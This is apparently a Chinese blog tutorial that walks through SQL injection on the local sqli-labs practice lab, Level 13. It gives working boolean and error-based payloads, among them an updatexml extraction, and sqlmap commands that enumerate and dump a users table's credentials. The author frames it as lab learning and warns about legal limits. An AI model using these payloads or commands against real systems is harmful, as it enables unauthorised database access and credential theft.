---
title: 从手工注入到自动化攻击——sqlmap 实战
url: https://mp.weixin.qq.com/s/yNnO9KH7cjRDTy6CQu-JJw
source: Doonsec's feed
date: 2026-01-06
fetch_date: 2026-01-07T03:28:08.404174
---

# 从手工注入到自动化攻击——sqlmap 实战

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4VtFHJjG37x9eiaukUuqb93UlqPWqx99XPz5DFUWKewMkLW17Jv1gyvw/0?wx_fmt=jpeg)

# 从手工注入到自动化攻击——sqlmap 实战

原创

武文学网安

武文学网安

![]()

在小说阅读器中沉浸阅读

大家好，我是武文。

在通过 sqli-labs 第 11 关之前，SQL 注入的学习重点是：

* 闭合方式
* 注释符
* UNION 回显
* 错误信息分析

但**从第 13 关开始**，很多人会明显感觉到一件事：payload 写对了，页面却什么都不显示。

## 一、为什么从第 13 关开始，要“先手工，再 sqlmap”？

**sqlmap 是一款自动化检测与利用 SQL 注入漏洞的免费开源工具。我们可以通过阅读sqlmap用户手册来掌握如何使用sqlmap。**

**https://sqlmap.highlight.ink/**

很多人一学 sqlmap 就直接：

```
sqlmap -u xxx --dump
```

这种方式有三个致命问题：

* 成功了，但不知道为什么成功
* 失败了，不知道是环境问题还是判断错误
* 一旦换环境，完全无法迁移经验

### 而正确的学习路径应该是：先由人判断：有没有注入？是什么类型？再由工具验证：判断是否正确，并完成攻击。

### sqlmap 的定位不是“代替思考”，而是**验证你的分析结论**。

实操篇：使用 sqlmap 攻击本地 sqli-labs

二、第一阶段：纯手工判断是否存在注入点（以第 13 关为例）

### 2.1 环境准备

* 本地已部署 sqli-labs
* 确认可以正常访问 Less-13 及以后关卡
* 已安装 sqlmap（推荐 GitHub 官方版本）

还没安装的小伙伴可以按照官方文档来操作：

https://sqlmap.highlight.ink/download-and-update

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib43LkicaCFExicxaSf1KpcpWyHkzsRCnp2ibHQQzbKLzqa7JXxjiaY6lv4CQ/640?wx_fmt=png&from=appmsg)

⚠️ 注意：这一阶段 **不追求脱库**，只做判断。

### 2.2. 抓包，明确可控输入点

访问 Less-13 登录页面，用 Burp 抓取请求：

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4XqHV2siaMaMYmww2O23nFO6WEwJtbbmc3oVajUXzPp8eG2iavrVohibzQ/640?wx_fmt=gif&from=appmsg)

```
可以明确：

* 注入点在 POST 参数
* 可控字段是：uname、passwd
```

```
### 2.3 第一轮测试，是否参与SQL解析
```

最基础测试：

```
uname=test'&passwd=test
```

观察响应结果,根据不同的响应结果可以有如下推论：

* 页面报 SQL 错误 → **明确存在注入**
* 页面异常但无报错 → **高度可疑**
* 页面无变化 → 不代表安全，可能被处理

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4Iy5Q3PMicg5HzJWRick72eiaHeM0DUHKukQz1K3FzMNwPkgFsJRqsK2jQ/640?wx_fmt=gif&from=appmsg)

在第 13 关中，可以看到右边蓝色 SQL 错误信息，这一步已经可以确认：用户输入直接进入了 SQL 语句。

2.4 第二轮测试：是否影响逻辑结果（Boolean 判断）

这里我们需要尝试构造不同的闭合参数，来判断它的闭合信息。通过测试可以判断出其闭合方式为单引号+括号(这里如何判断可以参考昨天的文章[SQL注入实战：从GET到POST的思维跨越 - sqli-labs第11关深度解析](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484225&idx=1&sn=f6b115a523db6cb4200628f2fce9807d&scene=21#wechat_redirect))。

```
') or 1=1 #') or 1=2 #
```

对比结果：

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4S6T80sPicbnLGm8hPfia44WeGCQvhiaRhwdxMAe6vmEjpDJQgexibXQqEQ/640?wx_fmt=gif&from=appmsg)

* `1=1` → 登录成功
* `1=2` → 登录失败

说明：

* 输入影响了 SQL 的逻辑判断
* 页面根据查询结果返回“成功 / 失败”
* **这是典型的 Boolean-Based SQL 注入特征**

到这里，我们已经可以下第一个结论：第 13 关至少存在 Boolean 型 SQL 注入。

2.4 第三轮测试：是否存在 Error-Based 利用空间

在 Boolean 成立的前提下，进一步测试执行期错误：

```
') and updatexml(1,concat(0x7e,database(),0x7e),1)#
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4wQdLIicyOxyGqMnADGiatWED4acR4I7acC1ADJYbvU8KsBlPfKfMQ5iaQ/640?wx_fmt=gif&from=appmsg)

页面返回：XPATH syntax error: '~security~'

说明：

* SQL 语法完整
* 函数被真实执行
* 错误发生在 **执行阶段**
* 错误内容被回显到页面

此时可以将结论升级为：第 13 关是一个Boolean + Error-Based 共存的场景

三、到这里为止：手工阶段已经“完成任务”

⚠️ 非常重要的一点：我们不再需要继续手工脱库。

因为我们已经确认了：

* ✔ 存在注入点
* ✔ 注入参数
* ✔ 注入类型（Boolean / Error）
* ✔ 数据库类型（MySQL）
* ✔ 是否存在回显通道

接下来继续手工，只是在重复劳动。

## 四、第二阶段：使用 sqlmap 验证我们的判断

### 4.1 保留原始请求，确保攻击条件一致

将 Burp 抓到的请求保存为 `req.txt`，

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib40Y9n1mTAribyDm2eXyAmLAibmroSuX983c97bT5Y30AVGddtgjGdIlQw/640?wx_fmt=gif&from=appmsg)

这里需要注意，要把uname中之前手动测试的updatexml等信息删掉，然后随便输入数字或test等名字，不然后面在使用sqlmap的时候会报错。

然后执行：

```
python sqlmap.py -r req.txt --batch
```

这里--batch表示从不询问用户输入，使用默认配置

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4Q76XLiaChIuZu0h4gK8olPjtWpKnBDiaZdoe3EwDSooSvxJmv1ebnpTQ/640?wx_fmt=gif&from=appmsg)

`我这里之前测试过，所以在截图保存的时候没有展示出每一步详细过程，各位小伙伴们在测试的时候会发现sqlmap的详细测试过程。`

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4SD7JnmV1mclLMNOwgEzCx6nxM6OkqEP7Zd61FhaPmgfuSHoskLSeEA/640?wx_fmt=png&from=appmsg)

从sqlmap的测试结果我们可以看到，其发现了两个注入类型：

error-based和time-base blind，即基于错误和时间盲注。与我们手动判断的一致（时间盲注和布尔盲注的异同前面文章讲过）。

### 4.2 主动约束 sqlmap（非常重要的学习动作）

既然你已经判断是 Error-Based，可以直接指定：

```
python sqlmap.py -r req.txt --technique=E --current-db
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4EsuDarRXjbyaficI22unfV9sagD8qovqeGlDia7yEJvjS4oA9AelOQWw/640?wx_fmt=gif&from=appmsg)

其中--current-db表示获取DBMS当前数据库，--technique=E表示使用报错型注入。

这一步的意义在于：不是让 sqlmap 自己“试路”，而是我告诉它：你该走哪条路。这才是“理解型使用工具”。

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib43JXniaibXJS7GLibQ9cUGfBhSoP0sbgQroY3HqIdVFfibIIziaLAxictjS3A/640?wx_fmt=png&from=appmsg)

从运行结果看，当前数据库名称为security。

## 五、第三阶段：完成攻击链（验证完整性）

在验证注入路径无误后，再执行完整枚举。可以使用以下参数获取我们想要的数据。

```
--current-db  #获取当前数据库--current-user #获取 DBMS 当前用户--users        # 枚举出 DBMS 所有用户--tables        #枚举出 DBMS 数据库中的所有表--columns       #枚举出 DBMS 表中的所有列--dump        #导出 DBMS 数据库表项-T tbl      #指定要枚举的DNMS数据表-D DB    #指定要枚举的DBMS数据库-C COL   #指定枚举的DBMS数据列--threads=THREADS  #设置HTTP(S)请求并发数最大值，默认为1-p TESTPARAMETER  #指定需要测试的参数
```

这里--dump命令谨慎使用，一是特别耗费时间，二是在实际渗透测试中，--dump表示托库，这个命令可能让你立即面临刑事指，非法获取计算机信息系统数据罪，3年以下或3-7年有期徒刑![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png)

技术能力≠使用边界，学习环境≠真实目标

```
python sqlmap.py -r "‪C:\Users\demon\Desktop\security\req.txt" --technique=E --current-db --tables --columns --threads=10
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4dTlbn8kX34JcB5U4eHFMAJgXl0I1D26ylN5j6cbN3RKzZ48MfBNBqg/640?wx_fmt=gif&from=appmsg)

通过上面的命令，我们可以获取到当前数据库，及表格和数据列

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4p41IuNR1U3GbPAJ72MdphF79aWAu7muhEicHaCOX1IuibQo0ADhnNoRA/640?wx_fmt=png&from=appmsg)

我们可以单独指定查看我们需要的数据，如查看所有数据库--dbs

```
python sqlmap.py -r "‪C:\Users\demon\Desktop\security\req.txt" -p uname --dbs --batch
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4N5avlibyymK2Mb0gDEicGKcicnHFu4PnJ4osf98fShppBc4kU6iayww4XA/640?wx_fmt=gif&from=appmsg)

查看指定数据库表-D  --tables

```
python sqlmap.py -r "‪C:\Users\demon\Desktop\security\req.txt" -p uname -D security --tables --batch
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4k4P7Ca0M52E6bYdic3Xqg8QjWZsHGiaIj8IXv9RFNsurQgRFsm4xiaRLg/640?wx_fmt=gif&from=appmsg)

可以获取security中有哪些表。

获取指定表users的字段

```
python sqlmap.py -r "‪C:\Users\demon\Desktop\security\req.txt" -p uname -D security -T suers --columns --batch
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4OARoevxdibicW3jvibe58djiaO9FzmVolOuYa9XAlv3nHoKCEU3lXKTFNQ/640?wx_fmt=gif&from=appmsg)

获取指定数据库security指定表users指定字段数据

```
python sqlmap.py -r "‪C:\Users\demon\Desktop\security\req.txt" -p uname -D security -T suers -C id,username,password --dump --batch
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFwpicQXMo3KmfuNfcoTgaib4tnd8mIWsPdycybUlCiaKl1ZRCOpzA2MWNMFnk1v21Czal8J08X63mIg/640?wx_fmt=gif&from=appmsg)

## 六、简要总结

在这一阶段，即使注入存在，页面也往往不再直接回显数据，单纯依赖 UNION 或错误显示已经不足以完成判断。相比“如何脱库”，更重要的是先确认：

* 是否存在注入点
* 注入属于哪一类型（Boolean / Error / Time）
* 是否具备继续利用的价值

因此，本文采用的思路是：先通过手工方式判断注入点与注入类型，再使用 sqlmap 验证判断结果，并完成后续利用。

sqlmap 的作用并不是代替分析，而是在判断成立后，用来验证结论并完成自动化攻击。

这一方法同样适用于后续第 14～16 关，也更接近真实环境中的 SQL 注入分析流程。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

武文学网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过